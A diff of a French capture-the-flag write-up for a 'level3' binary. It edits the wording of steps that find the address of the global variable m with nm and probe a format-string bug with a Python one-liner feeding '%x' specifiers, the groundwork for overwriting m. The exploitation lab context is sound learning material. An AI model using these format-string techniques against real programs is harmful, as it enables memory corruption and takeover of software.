@@ -15,12 +15,15 @@ $> ./level3
 %d
 512
 ```
-- On regarde ensuite qu'elle est l'addresse de la fonction contenant 
+- On regarde ensuite qu'elle est l'addresse de la fonction m. Que l'on veux overwrite.
+
 <pre>
 $> nm level3
 <strong>0804988c</strong> B m
 </pre>
-- On regarde a combien de %x il faut pour trouver l'adresse print
+
+- On regarde à combien de %x il faut pour trouver l'adresse print.
+
 <pre>
 $> (python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*5)") | ./level3
 AAAA200 b7fd1ac0 b7ff37d0 <strong>41414141 804988c</strong>
